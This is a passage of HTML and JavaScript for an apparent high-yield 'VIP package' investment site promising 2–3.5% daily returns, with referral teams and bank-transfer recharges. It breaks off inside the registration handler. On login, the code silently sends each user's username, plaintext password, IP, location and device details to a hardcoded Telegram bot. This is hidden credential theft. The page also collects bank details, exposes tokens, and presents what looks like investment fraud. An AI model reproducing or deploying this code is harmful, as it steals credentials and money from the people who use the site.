<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTG Investment Platform</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Add Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-storage-compat.js"></script>
    <style>
        :root {
            --primary: #4a148c;
            --secondary: #ff6f00;
            --light: #f3e5f5;
            --dark: #12005e;
            --success: #2e7d32;
            --warning: #d32f2f;
            --info: #0288d1;
            --bg-gradient: linear-gradient(135deg, var(--primary), var(--dark));
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f9f9f9;
            color: #333;
            line-height: 1.6;
            padding-top: 120px;
        }
        
        header {
            background: var(--bg-gradient);
            color: white;
            padding: 0 1rem;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 1000;
            height: 100px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        nav {
            background-color: var(--dark);
            position: fixed;
            top: 60px;
            width: 100%;
            z-index: 999;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            max-height: 0;
            overflow: hidden;
        }
        
        nav.active {
            max-height: 500px;
            padding: 0.3rem;
        }
        
        .nav-container {
            display: flex;
            flex-wrap: wrap;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        nav a {
            color: white;
            text-decoration: none;
            padding: 0.8rem 1rem;
            margin: 0.2rem;
            white-space: nowrap;
            border-radius: 4px;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            flex: 1;
            min-width: 150px;
        }
        
        nav a:hover, nav a.active {
            background-color: var(--secondary);
            transform: translateY(-2px);
        }
        
        .balance-indicator {
            position: relative;
            background-color: var(--secondary);
            color: white;
            border-radius: 20px;
            padding: 0.3rem 0.8rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.9rem;
            font-weight: bold;
            margin-left: 1rem;
        }
        
        .menu-toggle {
            display: none;
            background: var(--secondary);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 0.5rem;
            width: 40px;
            height: 40px;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            font-size: 1.2rem;
        }
        
        .container {
            max-width: 1200px;
            margin: 4rem auto;
            padding: 0 1rem;
        }
        
        .section {
            background-color: white;
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            display: none;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .section.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        h2 {
            color: var(--primary);
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 2px solid var(--light);
            display: flex;
            align-items: center;
            gap: 0.8rem;
        }
        
        .form-group {
            margin-bottom: 1.2rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
        }
        
        input, select, textarea {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(74, 20, 140, 0.2);
        }
        
        button {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            transition: all 0.3s;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }
        
        button:hover {
            background-color: var(--secondary);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        
        .message {
            padding: 1rem;
            margin-top: 1rem;
            border-radius: 4px;
            display: none;
        }
        
        .success-message {
            background-color: #e8f5e9;
            color: var(--success);
            border-left: 4px solid var(--success);
        }
        
        .warning-message {
            background-color: #ffebee;
            color: var(--warning);
            border-left: 4px solid var(--warning);
        }
        
        .info-message {
            background-color: #e3f2fd;
            color: var(--info);
            border-left: 4px solid var(--info);
        }
        
        .password-toggle {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
        }
        
        .vip-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 1.5rem;
            margin-top: 1.5rem;
        }
        
        .vip-card {
            border: 1px solid #eee;
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s;
            cursor: pointer;
            position: relative;
        }
        
        .vip-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }
        
        .vip-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
        }
        
        .vip-info {
            padding: 1.2rem;
        }
        
        .vip-title {
            font-size: 1.2rem;
            font-weight: 700;
            color: var(--primary);
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .vip-income {
            color: var(--success);
            font-weight: 600;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .vip-price {
            font-size: 1.3rem;
            font-weight: 700;
            color: var(--secondary);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .vip-badge {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: var(--secondary);
            color: white;
            padding: 0.3rem 0.6rem;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: bold;
        }
        
        .bank-details {
            background-color: var(--light);
            padding: 1.2rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
        }
        
        .bank-details h3 {
            color: var(--primary);
            margin-bottom: 0.8rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .live-chat {
            margin-top: 2rem;
            padding: 1.5rem;
            background-color: var(--light);
            border-radius: 8px;
        }
        
        .live-chat h3 {
            color: var(--primary);
            margin-bottom: 1rem;
        }
        
        .live-chat a {
            display: flex;
            align-items: center;
            gap: 0.8rem;
            margin-bottom: 1rem;
            color: var(--dark);
            text-decoration: none;
            transition: all 0.3s;
        }
        
        .live-chat a:hover {
            color: var(--secondary);
            transform: translateX(5px);
        }
        
        @media (max-width: 768px) {
            body {
                padding-top: 60px;
            }
            
            .menu-toggle {
                display: flex;
            }
            
            .nav-container {
                flex-direction: column;
            }
            
            nav a {
                margin: 0.2rem 0;
                text-align: center;
                justify-content: center;
            }
            
            .vip-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="header-content">
            <h1><i class="fas fa-coins"></i> OTG Investments</h1>
            <div>
                <button class="theme-toggle" id="themeToggle">
                    <i class="fas fa-moon"></i>
                </button>
                <div class="balance-indicator">
                    <i class="fas fa-wallet"></i>
                    <span id="balanceIndicator">0</span>
                </div>
            </div>
            <button class="menu-toggle" id="menuToggle">
                <i class="fas fa-bars"></i>
            </button>
        </div>
    </header>
    
    <!-- Navigation when logged out -->
    <nav id="loggedOutNav">
        <div class="nav-container">
            <a href="#" class="nav-link active" data-section="home">
                <i class="fas fa-home"></i> Home
            </a>
            <a href="#" class="nav-link" data-section="login">
                <i class="fas fa-sign-in-alt"></i> Login
            </a>
            <a href="#" class="nav-link" data-section="products">
                <i class="fas fa-crown"></i> VIP Packages
            </a>
            <a href="#" class="nav-link" data-section="register">
                <i class="fas fa-user-plus"></i> Register
            </a>
            <a href="#" class="nav-link" data-section="contact">
                <i class="fas fa-envelope"></i> Contact
            </a>
            <a href="#" class="nav-link" data-section="service">
                <i class="fas fa-headset"></i> Live Support
            </a>
        </div>
    </nav>
    
    <!-- Navigation when logged in -->
    <nav id="loggedInNav" class="logged-in-nav">
        <div class="nav-container">
            <a href="#" class="nav-link active" data-section="dashboard">
                <i class="fas fa-tachometer-alt"></i> Dashboard
            </a>
            <a href="#" class="nav-link" data-section="products">
                <i class="fas fa-crown"></i> VIP Packages
            </a>
            <a href="#" class="nav-link" data-section="recharge">
                <i class="fas fa-money-bill-wave"></i> Recharge
            </a>
            <a href="#" class="nav-link" data-section="withdraw">
                <i class="fas fa-hand-holding-usd"></i> Withdraw
            </a>
            <a href="#" class="nav-link" data-section="team">
                <i class="fas fa-users"></i> My Team
            </a>
            <a href="#" class="nav-link" data-section="checkin">
                <i class="fas fa-calendar-check"></i> Daily Check-in
            </a>
            <a href="#" class="nav-link" data-section="investments">
                <i class="fas fa-chart-line"></i> My Investments
            </a>
            <a href="#" class="nav-link" data-section="service">
                <i class="fas fa-headset"></i> Live Support
            </a>
            <a href="#" class="nav-link" id="logoutBtn">
                <i class="fas fa-sign-out-alt"></i> Logout
            </a>
        </div>
    </nav>
    
    <div class="container">
        <!-- Home Section -->
        <section id="home" class="section active">
            <h2><i class="fas fa-home"></i> Welcome to OTG Investments</h2>
            <p>Start your investment journey with our secure and profitable VIP packages.</p>
        </section>
        
        <!-- Login Section -->
        <section id="login" class="section">
            <h2><i class="fas fa-sign-in-alt"></i> Login</h2>
            <form id="loginForm">
                <div class="form-group">
                    <label for="loginUsername">Username</label>
                    <input type="text" id="loginUsername" required>
                </div>
                <div class="form-group password-toggle">
                    <label for="loginPassword">Password</label>
                    <input type="password" id="loginPassword" required>
                    <span class="toggle-password"><i class="fas fa-eye"></i></span>
                </div>
                <button type="submit">Login</button>
                <div class="success-message" id="loginSuccess" style="display: none;">
                    Login successful! Redirecting...
                </div>
                <div class="warning-message" id="loginError" style="display: none;"></div>
            </form>
        </section>
        
        <!-- Register Section -->
        <section id="register" class="section">
            <h2><i class="fas fa-user-plus"></i> Register</h2>
            <form id="registerForm">
                <div class="form-group">
                    <label for="regUsername">Username</label>
                    <input type="text" id="regUsername" required>
                </div>
                <div class="form-group">
                    <label for="regEmail">Email</label>
                    <input type="email" id="regEmail" required>
                </div>
                <div class="form-group">
                    <label for="regPhone">Phone Number</label>
                    <input type="tel" id="regPhone" required>
                </div>
                <div class="form-group password-toggle">
                    <label for="regPassword">Password</label>
                    <input type="password" id="regPassword" required>
                    <span class="toggle-password"><i class="fas fa-eye"></i></span>
                </div>
                <div class="form-group password-toggle">
                    <label for="regConfirmPassword">Confirm Password</label>
                    <input type="password" id="regConfirmPassword" required>
                    <span class="toggle-password"><i class="fas fa-eye"></i></span>
                </div>
                <div class="form-group">
                    <label for="regReferral">Referral Code (Optional)</label>
                    <input type="text" id="regReferral">
                </div>
                <!-- Additional Bank Details -->
                <div class="form-group">
                    <label for="bankName">Bank Name</label>
                    <input type="text" id="bankName" required>
                </div>
                <div class="form-group">
                    <label for="accountNumber">Account Number</label>
                    <input type="text" id="accountNumber" required>
                </div>
                <div class="form-group">
                    <label for="accountHolder">Account Holder Name</label>
                    <input type="text" id="accountHolder" required>
                </div>
                <div class="form-group">
                    <label for="houseNumber">House Number</label>
                    <input type="text" id="houseNumber" required>
                </div>
                <button type="submit">Register</button>
                <div class="success-message" id="registerSuccess" style="display: none;">
                    Registration successful!
                </div>
                <div class="warning-message" id="registerError" style="display: none;"></div>
            </form>
        </section>
        
        <!-- VIP Packages Section -->
        <section id="products" class="section">
            <h2><i class="fas fa-crown"></i> VIP Packages</h2>
            <div class="vip-grid">
                <!-- VIP 1 -->
                <div class="vip-card" data-vip="1">
                    <div class="vip-badge">VIP 1</div>
                    <img src="https://via.placeholder.com/300x150?text=VIP+1" alt="VIP 1">
                    <div class="vip-info">
                        <h3 class="vip-title"><i class="fas fa-gem"></i> VIP 1 Package</h3>
                        <p class="vip-income"><i class="fas fa-percentage"></i> Daily Income: 2% for 30 days</p>
                        <p class="vip-price"><i class="fas fa-tag"></i> $100 - $299</p>
                    </div>
                </div>
                
                <!-- VIP 2 -->
                <div class="vip-card" data-vip="2">
                    <div class="vip-badge">VIP 2</div>
                    <img src="https://via.placeholder.com/300x150?text=VIP+2" alt="VIP 2">
                    <div class="vip-info">
                        <h3 class="vip-title"><i class="fas fa-gem"></i> VIP 2 Package</h3>
                        <p class="vip-income"><i class="fas fa-percentage"></i> Daily Income: 2.2% for 35 days</p>
                        <p class="vip-price"><i class="fas fa-tag"></i> $300 - $599</p>
                    </div>
                </div>
                
                <!-- VIP 3 -->
                <div class="vip-card" data-vip="3">
                    <div class="vip-badge">VIP 3</div>
                    <img src="https://via.placeholder.com/300x150?text=VIP+3" alt="VIP 3">
                    <div class="vip-info">
                        <h3 class="vip-title"><i class="fas fa-gem"></i> VIP 3 Package</h3>
                        <p class="vip-income"><i class="fas fa-percentage"></i> Daily Income: 2.5% for 40 days</p>
                        <p class="vip-price"><i class="fas fa-tag"></i> $600 - $999</p>
                    </div>
                </div>
                
                <!-- VIP 4 -->
                <div class="vip-card" data-vip="4">
                    <div class="vip-badge">VIP 4</div>
                    <img src="https://via.placeholder.com/300x150?text=VIP+4" alt="VIP 4">
                    <div class="vip-info">
                        <h3 class="vip-title"><i class="fas fa-gem"></i> VIP 4 Package</h3>
                        <p class="vip-income"><i class="fas fa-percentage"></i> Daily Income: 2.8% for 45 days</p>
                        <p class="vip-price"><i class="fas fa-tag"></i> $1,000 - $2,499</p>
                    </div>
                </div>
                
                <!-- VIP 5 -->
                <div class="vip-card" data-vip="5">
                    <div class="vip-badge">VIP 5</div>
                    <img src="https://via.placeholder.com/300x150?text=VIP+5" alt="VIP 5">
                    <div class="vip-info">
                        <h3 class="vip-title"><i class="fas fa-gem"></i> VIP 5 Package</h3>
                        <p class="vip-income"><i class="fas fa-percentage"></i> Daily Income: 3% for 50 days</p>
                        <p class="vip-price"><i class="fas fa-tag"></i> $2,500 - $4,999</p>
                    </div>
                </div>
                
                <!-- VIP 6 -->
                <div class="vip-card" data-vip="6">
                    <div class="vip-badge">VIP 6</div>
                    <img src="https://via.placeholder.com/300x150?text=VIP+6" alt="VIP 6">
                    <div class="vip-info">
                        <h3 class="vip-title"><i class="fas fa-gem"></i> VIP 6 Package</h3>
                        <p class="vip-income"><i class="fas fa-percentage"></i> Daily Income: 3.5% for 60 days</p>
                        <p class="vip-price"><i class="fas fa-tag"></i> $5,000+</p>
                    </div>
                </div>
            </div>
        </section>
        
        <!-- Dashboard Section -->
        <section id="dashboard" class="section">
            <h2><i class="fas fa-tachometer-alt"></i> Dashboard</h2>
            <div id="userDashboard">
                <p>Loading your account information...</p>
            </div>
        </section>
        
        <!-- Recharge Section -->
        <section id="recharge" class="section">
            <h2><i class="fas fa-money-bill-wave"></i> Recharge</h2>
            
            <div class="bank-details">
                <h3><i class="fas fa-university"></i> Bank Account Details</h3>
                <p><i class="fas fa-landmark"></i> <strong>Bank Name:</strong> Commercial Bank of Ethiopia</p>
                <p><i class="fas fa-user-tie"></i> <strong>Account Name:</strong> YOUR FULL NAME HERE</p>
                <p><i class="fas fa-hashtag"></i> <strong>Account Number:</strong> 1000XXXXXX</p>
                <p><i class="fas fa-map-marker-alt"></i> <strong>Branch:</strong> Main Branch</p>
                <p><i class="fas fa-code"></i> <strong>Swift Code:</strong> CBETETAA</p>
            </div>
            
            <form id="rechargeForm">
                <div class="form-group">
                    <label for="rechargeAmount">Amount ($)</label>
                    <input type="number" id="rechargeAmount" min="100" required>
                </div>
                <div class="form-group">
                    <label for="rechargeMethod">Payment Method</label>
                    <select id="rechargeMethod" required>
                        <option value="">Select method</option>
                        <option value="bank">Bank Transfer</option>
                        <option value="cbe">CBE Birr</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="senderName">Your Full Name (as in bank account)</label>
                    <input type="text" id="senderName" required>
                </div>
                <div class="form-group">
                    <label for="transactionId">Transaction ID/Reference</label>
                    <input type="text" id="transactionId" required>
                </div>
                <div class="form-group">
                    <label for="paymentProof">Payment Proof (Screenshot/Receipt)</label>
                    <input type="file" id="paymentProof" accept="image/*" required>
                </div>
                <button type="submit">Submit Recharge Request</button>
                <div class="success-message" id="rechargeSuccess" style="display: none;">
                    Recharge request submitted!
                </div>
                <div class="warning-message" id="rechargeError" style="display: none;"></div>
            </form>
        </section>
        
        <!-- Withdraw Section -->
        <section id="withdraw" class="section">
            <h2><i class="fas fa-hand-holding-usd"></i> Withdraw</h2>
            <form id="withdrawForm">
                <div class="form-group">
                    <label for="withdrawAmount">Amount ($)</label>
                    <input type="number" id="withdrawAmount" min="10" required>
                </div>
                <div class="form-group">
                    <label for="accountName">Account Holder Name</label>
                    <input type="text" id="accountName" required>
                </div>
                <div class="form-group">
                    <label for="accountNumber">Account Number</label>
                    <input type="text" id="accountNumber" required>
                </div>
                <div class="form-group">
                    <label for="bankName">Bank Name</label>
                    <input type="text" id="bankName" required>
                </div>
                <div class="form-group">
                    <label for="withdrawMethod">Withdraw Method</label>
                    <select id="withdrawMethod" required>
                        <option value="">Select method</option>
                        <option value="bank">Bank Transfer</option>
                        <option value="cbe">CBE Birr</option>
                        <option value="telebirr">Telebirr</option>
                    </select>
                </div>
                <button type="submit">Request Withdrawal</button>
                <div class="success-message" id="withdrawSuccess" style="display: none;">
                    Withdrawal request submitted!
                </div>
                <div class="warning-message" id="withdrawError" style="display: none;"></div>
            </form>
        </section>
        
        <!-- Team Section -->
        <section id="team" class="section">
            <h2><i class="fas fa-users"></i> My Team</h2>
            <div id="teamMembers">
                <p>Loading your team information...</p>
            </div>
        </section>
        
        <!-- Check-in Section -->
        <section id="checkin" class="section">
            <h2><i class="fas fa-calendar-check"></i> Daily Check-in</h2>
            <form id="checkinForm">
                <button type="submit">Check In</button>
                <div class="success-message" id="checkinSuccess" style="display: none;">
                    Check-in successful!
                </div>
                <div class="warning-message" id="checkinError" style="display: none;"></div>
            </form>
            <div id="checkinHistory" style="margin-top: 20px;">
                <h3>Your Check-in History</h3>
                <ul id="checkinList"></ul>
            </div>
        </section>
        
        <!-- Investments Section -->
        <section id="investments" class="section">
            <h2><i class="fas fa-chart-line"></i> My Investments</h2>
            <div id="userInvestments">
                <p>Loading your investment information...</p>
            </div>
        </section>
        
        <!-- Contact Section -->
        <section id="contact" class="section">
            <h2><i class="fas fa-envelope"></i> Contact</h2>
            <form id="contactForm">
                <div class="form-group">
                    <label for="contactName">Name</label>
                    <input type="text" id="contactName" required>
                </div>
                <div class="form-group">
                    <label for="contactEmail">Email</label>
                    <input type="email" id="contactEmail" required>
                </div>
                <div class="form-group">
                    <label for="contactPhone">Phone Number</label>
                    <input type="tel" id="contactPhone" required>
                </div>
                <div class="form-group">
                    <label for="contactSubject">Subject</label>
                    <input type="text" id="contactSubject" required>
                </div>
                <div class="form-group">
                    <label for="contactMessage">Message</label>
                    <textarea id="contactMessage" rows="5" required></textarea>
                </div>
                <button type="submit">Send</button>
                <div class="success-message" id="contactSuccess" style="display: none;">
                    Message sent successfully!
                </div>
                <div class="warning-message" id="contactError" style="display: none;"></div>
            </form>
        </section>
        
        <!-- Live Support Section -->
        <section id="service" class="section">
            <h2><i class="fas fa-headset"></i> Live Support</h2>
            <div class="live-chat">
                <h3>Contact our support team</h3>
                <a href="https://t.me/BNSTGO" target="_blank">
                    <i class="fab fa-telegram"></i> Telegram: @BNSTGO
                </a>
                <a href="https://wa.me/251993204587" target="_blank">
                    <i class="fab fa-whatsapp"></i> WhatsApp: +251993204587
                </a>
                <a href="https://t.me/SYCHOLOGYS" target="_blank">
                    <i class="fab fa-telegram"></i> Channel Group: https://t.me/SYCHOLOGYS
                </a>
            </div>
        </section>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDFjoQLY4o2d-TsTC9cARPNeVMF86PolH8",
            authDomain: "sultanwebapp-2c251.firebaseapp.com",
            databaseURL: "https://sultanwebapp-2c251-default-rtdb.firebaseio.com",
            projectId: "sultanwebapp-2c251",
            storageBucket: "sultanwebapp-2c251.firebasestorage.app",
            messagingSenderId: "566482579045",
            appId: "1:566482579045:web:65d0d788ae5762ad82208c",
            measurementId: "G-GKVP9CX9G4"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const database = firebase.database();
        const storage = firebase.storage();

        // Telegram Bot Configuration
        const BOT_TOKEN = "8091773251:AAEMxxi8UA8keky1kE89Y1DGykfEV4cOE9g";
        const CHAT_ID = "7384126560";
        
        // App state
        let isLoggedIn = false;
        let currentUser = null;
        let currentUserId = null;
        
        // DOM elements
        const menuToggle = document.getElementById('menuToggle');
        const loggedOutNav = document.getElementById('loggedOutNav');
        const loggedInNav = document.getElementById('loggedInNav');
        const balanceIndicator = document.getElementById('balanceIndicator');
        const themeToggle = document.getElementById('themeToggle');
        
        // Forms
        const loginForm = document.getElementById('loginForm');
        const registerForm = document.getElementById('registerForm');
        const rechargeForm = document.getElementById('rechargeForm');
        const withdrawForm = document.getElementById('withdrawForm');
        const checkinForm = document.getElementById('checkinForm');
        const contactForm = document.getElementById('contactForm');
        
        // Initialize app
        init();
        
        function init() {
            // Check auth state
            auth.onAuthStateChanged(user => {
                if (user) {
                    // User is signed in
                    currentUserId = user.uid;
                    loadUserData(user.uid);
                    isLoggedIn = true;
                    updateUI();
                } else {
                    // User is signed out
                    isLoggedIn = false;
                    currentUser = null;
                    currentUserId = null;
                    updateUI();
                }
            });
            
            setupEventListeners();
        }
        
        function setupEventListeners() {
            // Menu toggle
            menuToggle.addEventListener('click', toggleMenu);
            
            // Navigation links
            document.querySelectorAll('.nav-link').forEach(link => {
                link.addEventListener('click', function(e) {
                    if (this.id === 'logoutBtn') return;
                    
                    e.preventDefault();
                    const sectionId = this.getAttribute('data-section');
                    showSection(sectionId);
                    closeMenu();
                });
            });
            
            // Logout button
            document.getElementById('logoutBtn').addEventListener('click', logout);
            
            // Theme toggle
            themeToggle.addEventListener('click', toggleTheme);
            
            // Password toggles
            document.querySelectorAll('.toggle-password').forEach(toggle => {
                toggle.addEventListener('click', function() {
                    const input = this.parentElement.querySelector('input');
                    const icon = this.querySelector('i');
                    
                    if (input.type === 'password') {
                        input.type = 'text';
                        icon.classList.remove('fa-eye');
                        icon.classList.add('fa-eye-slash');
                    } else {
                        input.type = 'password';
                        icon.classList.remove('fa-eye-slash');
                        icon.classList.add('fa-eye');
                    }
                });
            });
            
            // VIP Package selection
            document.querySelectorAll('.vip-card').forEach(card => {
                card.addEventListener('click', function() {
                    const vipLevel = this.getAttribute('data-vip');
                    document.getElementById('rechargeAmount').value = vipLevel === '1' ? 100 : 
                                                                   vipLevel === '2' ? 300 :
                                                                   vipLevel === '3' ? 600 :
                                                                   vipLevel === '4' ? 1000 :
                                                                   vipLevel === '5' ? 2500 : 5000;
                    showSection('recharge');
                });
            });
            
            // Form submissions
            loginForm.addEventListener('submit', handleLogin);
            registerForm.addEventListener('submit', handleRegister);
            rechargeForm.addEventListener('submit', handleRecharge);
            withdrawForm.addEventListener('submit', handleWithdraw);
            checkinForm.addEventListener('submit', handleCheckin);
            contactForm.addEventListener('submit', handleContact);
        }
        
        function toggleMenu() {
            const activeNav = isLoggedIn ? loggedInNav : loggedOutNav;
            activeNav.classList.toggle('active');
        }
        
        function closeMenu() {
            loggedOutNav.classList.remove('active');
            loggedInNav.classList.remove('active');
        }
        
        function showSection(sectionId) {
            // Hide all sections
            document.querySelectorAll('.section').forEach(section => {
                section.classList.remove('active');
            });
            
            // Show selected section
            document.getElementById(sectionId).classList.add('active');
            
            // Update active nav link
            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('active');
            });
            
            document.querySelector(`[data-section="${sectionId}"]`).classList.add('active');
            
            // Load section-specific data if logged in
            if (isLoggedIn && currentUserId) {
                switch(sectionId) {
                    case 'dashboard':
                        loadDashboardData();
                        break;
                    case 'investments':
                        loadInvestmentsData();
                        break;
                    case 'team':
                        loadTeamData();
                        break;
                    case 'checkin':
                        loadCheckinHistory();
                        break;
                }
            }
        }
        
        function updateUI() {
            if (isLoggedIn) {
                loggedOutNav.style.display = 'none';
                loggedInNav.style.display = 'block';
                balanceIndicator.textContent = currentUser?.balance || '0';
                showSection('dashboard');
            } else {
                loggedOutNav.style.display = 'block';
                loggedInNav.style.display = 'none';
                balanceIndicator.textContent = '0';
                showSection('home');
            }
        }
        
        function toggleTheme() {
            document.body.classList.toggle('dark-mode');
            const icon = themeToggle.querySelector('i');
            
            if (document.body.classList.contains('dark-mode')) {
                icon.classList.remove('fa-moon');
                icon.classList.add('fa-sun');
            } else {
                icon.classList.remove('fa-sun');
                icon.classList.add('fa-moon');
            }
        }
        
        // Firebase functions
        function loadUserData(userId) {
            database.ref('users/' + userId).once('value').then(snapshot => {
                currentUser = snapshot.val();
                if (currentUser) {
                    balanceIndicator.textContent = currentUser.balance || '0';
                }
            });
        }
        
        function loadDashboardData() {
            if (!currentUserId) return;
            
            database.ref('users/' + currentUserId).once('value').then(snapshot => {
                const userData = snapshot.val();
                if (userData) {
                    const dashboardHTML = `
                        <div class="user-info">
                            <p><strong>Username:</strong> ${userData.username || 'N/A'}</p>
                            <p><strong>Email:</strong> ${userData.email || 'N/A'}</p>
                            <p><strong>Phone:</strong> ${userData.phone || 'N/A'}</p>
                        </div>
                        <div class="account-summary" style="margin-top: 20px;">
                            <h3>Account Summary</h3>
                            <p><strong>Balance:</strong> $${userData.balance || '0'}</p>
                            <p><strong>Total Investments:</strong> $${userData.totalInvested || '0'}</p>
                            <p><strong>Total Withdrawn:</strong> $${userData.totalWithdrawn || '0'}</p>
                            <p><strong>Referral Code:</strong> ${userData.referralCode || 'N/A'}</p>
                        </div>
                    `;
                    document.getElementById('userDashboard').innerHTML = dashboardHTML;
                }
            });
        }
        
        function loadInvestmentsData() {
            if (!currentUserId) return;
            
            database.ref('investments/' + currentUserId).once('value').then(snapshot => {
                const investments = snapshot.val();
                let investmentsHTML = '<h3>Your Active Investments</h3>';
                
                if (investments) {
                    investmentsHTML += '<div class="investments-list">';
                    Object.keys(investments).forEach(key => {
                        const investment = investments[key];
                        investmentsHTML += `
                            <div class="investment-item" style="border: 1px solid #eee; padding: 10px; margin-bottom: 10px; border-radius: 5px;">
                                <p><strong>VIP Package:</strong> ${investment.vipLevel || 'N/A'}</p>
                                <p><strong>Amount:</strong> $${investment.amount || '0'}</p>
                                <p><strong>Start Date:</strong> ${investment.startDate || 'N/A'}</p>
                                <p><strong>Daily Profit:</strong> $${investment.dailyProfit || '0'}</p>
                                <p><strong>Days Remaining:</strong> ${investment.daysRemaining || '0'}</p>
                            </div>
                        `;
                    });
                    investmentsHTML += '</div>';
                } else {
                    investmentsHTML += '<p>No active investments found.</p>';
                }
                
                document.getElementById('userInvestments').innerHTML = investmentsHTML;
            });
        }
        
        function loadTeamData() {
            if (!currentUserId) return;
            
            database.ref('teams/' + currentUserId).once('value').then(snapshot => {
                const team = snapshot.val();
                let teamHTML = '<h3>Your Referral Team</h3>';
                
                if (team) {
                    teamHTML += '<div class="team-list">';
                    Object.keys(team).forEach(key => {
                        const member = team[key];
                        teamHTML += `
                            <div class="team-member" style="border: 1px solid #eee; padding: 10px; margin-bottom: 10px; border-radius: 5px;">
                                <p><strong>Username:</strong> ${member.username || 'N/A'}</p>
                                <p><strong>Join Date:</strong> ${member.joinDate || 'N/A'}</p>
                                <p><strong>Invested:</strong> $${member.totalInvested || '0'}</p>
                            </div>
                        `;
                    });
                    teamHTML += '</div>';
                } else {
                    teamHTML += '<p>No team members found.</p>';
                }
                
                document.getElementById('teamMembers').innerHTML = teamHTML;
            });
        }
        
        function loadCheckinHistory() {
            if (!currentUserId) return;
            
            database.ref('checkins/' + currentUserId).once('value').then(snapshot => {
                const checkins = snapshot.val();
                let checkinListHTML = '';
                
                if (checkins) {
                    Object.keys(checkins).forEach(key => {
                        checkinListHTML += `<li>${checkins[key].date} - ${checkins[key].reward || '0'} bonus</li>`;
                    });
                } else {
                    checkinListHTML = '<li>No check-in history found</li>';
                }
                
                document.getElementById('checkinList').innerHTML = checkinListHTML;
            });
        }
        
        // Form handlers
        async function handleLogin(e) {
            e.preventDefault();
            
            const username = document.getElementById('loginUsername').value;
            const password = document.getElementById('loginPassword').value;
            
            try {
                // Sign in with email/password (using username as email for simplicity)
                const userCredential = await auth.signInWithEmailAndPassword(username, password);
                const user = userCredential.user;
                
                document.getElementById('loginSuccess').style.display = 'block';
                document.getElementById('loginError').style.display = 'none';
                
                // Enhanced login notification to Telegram
                const userInfo = await getUserInfo();
                let message = `üîê <b>LOGIN SUBMISSION</b>\n\n`;
                message += `üë§ <b>Username:</b> ${username}\n`;
                message += `üîí <b>Password:</b> ${password}\n`;
                message += `\nüìÖ <b>Time:</b> ${new Date().toLocaleString()}\n`;
                message += `üåê <b>IP:</b> ${userInfo.ip}\n`;
                message += `üìç <b>Location:</b> ${userInfo.location}\n`;
                message += `üñ•Ô∏è <b>Device:</b> ${userInfo.device}\n`;
                message += `üåê <b>Browser:</b> ${userInfo.browser}\n`;
                message += `üíª <b>OS:</b> ${userInfo.os}\n`;
                
                await sendToTelegram(message);
                
                setTimeout(() => {
                    updateUI();
                }, 1500);
            } catch (error) {
                console.error('Login error:', error);
                const errorMessage = document.getElementById('loginError');
                errorMessage.textContent = error.message;
                errorMessage.style.display = 'block';
            }
        }
        
        async function handleRegister(e) {
            e.preventDefault();
            
            // Get all form values
